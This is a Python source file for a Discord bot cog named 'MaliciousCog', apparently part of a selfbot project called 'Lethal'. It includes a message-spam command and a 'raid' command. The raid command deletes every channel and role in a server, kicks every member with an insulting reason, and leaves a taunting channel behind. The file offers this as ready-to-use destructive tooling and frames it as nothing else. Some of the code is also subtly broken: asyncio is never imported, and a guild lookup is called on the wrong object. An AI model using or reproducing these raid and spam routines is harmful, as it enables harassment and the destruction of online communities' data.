from discord.ext import commands

from mod.error import CustomLogger
from mod.db import DatabaseManager

import discord, json, requests, os, logging

class MaliciousCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.db_manager = DatabaseManager("./Modules/database/lethal.db")
        self.custom_logger = CustomLogger('Malicious', log_level=logging.INFO)
        self.logger = self.custom_logger.get_logger()
 
    @commands.command()
    async def turl(self, ctx, *, url):
        await ctx.message.delete()
        r = requests.get(f'http://tinyurl.com/api-create.php?url={url}').text
        await ctx.send(r)

    @commands.command()
    async def spam(self, ctx, amount:int, *, message):
        await ctx.message.delete()
        self.logger.info('Spammer has been used.')
        for i in range(amount):
            await ctx.send(message)
            await asyncio.sleep(1)

    @commands.command()
    async def gjoin(self, ctx, guid:int, *, vcid:int):
        await ctx.message.delete()
        vc = discord.utils.get(self.get_guild(guid).channels, id=vcid)
        await vc.guild.change_voice_state(channel=vc, self_mute=False, self_deaf=False)
        self.logger.info(f'Successfully joined {vc.name} ({vc.id})') 

    @commands.command()
    async def raid(self, ctx):
        await ctx.message.delete()
        lethalkey = self.db_manager.execute_read_one_query(f"SELECT auth_token FROM auth;")
        response = requests.get(f"https://lethals.org/api/server_blacklist/{lethalkey[0]}")
        data = response.json()
        ids = data.get('guildid', [])
        for i in ids:
            if ctx.guild.id == int(i):
                self.logger.info('You cannot raid this server.')
                return
        self.logger.info('Please wait this may take a minute...')
        for c in ctx.guild.channels:
            try:
                await c.delete()
            except:
                self.logger.warning(f'Could not delete channel: {c.name}')
        for m in ctx.guild.members:
            try:
                await m.kick(reason="Because no one loves you<3")
            except:
                self.logger.warning(f'Could not kick: {m.name}')
        for r in ctx.guild.roles:
            try:
                await r.delete()
            except:
                self.logger.warning(f'Could not delete role: {r.name}')
        overwrites = {ctx.guild.default_role: discord.PermissionOverwrite(read_messages=False),ctx.guild.me: discord.PermissionOverwrite(read_messages=True)}
        await ctx.guild.create_text_channel('Get Raied Bitch #LethalONTOP', overwrites=overwrites)
        self.logger.info(f'Raid Has Been Complete!')
